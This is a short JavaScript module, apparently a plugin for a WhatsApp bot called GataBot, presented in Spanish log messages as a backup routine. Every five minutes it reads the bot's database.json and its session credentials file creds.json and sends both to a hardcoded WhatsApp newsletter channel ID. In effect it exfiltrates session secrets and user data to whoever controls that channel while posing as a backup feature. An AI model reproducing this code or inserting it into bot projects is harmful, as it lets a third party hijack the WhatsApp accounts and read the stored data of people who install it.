import fs from 'fs';

const ID_CANAL  = "120363349916000764@newsletter"; 

const enviarBackup = async (conn) => {
try {
let d = new Date();
let date = d.toLocaleDateString('es', { day: 'numeric', month: 'long', year: 'numeric' });
let database = await fs.promises.readFile('./database.json');
let creds = await fs.promises.readFile('./GataBotSession/creds.json');

await conn.sendMessage(ID_CANAL, `*🗓️ Database: ${date}*`, { document: database, mimetype: 'application/json', fileName: `database.json` });
await conn.sendMessage(ID_CANAL, { document: creds, mimetype: 'application/json', fileName: `creds.json` });
console.log("Respaldo enviado correctamente.");
} catch (e) {
console.error("Error al enviar el respaldo:", e);
}};

setInterval(() => {
if (global.conn) {
enviarBackup(global.conn); 
} else {
console.error("Conexión no encontrada. Asegúrate de que el bot esté iniciado.");
}}, 5 * 60 * 1000); //24 * 60 * 60 * 1000); 

export default enviarBackup;
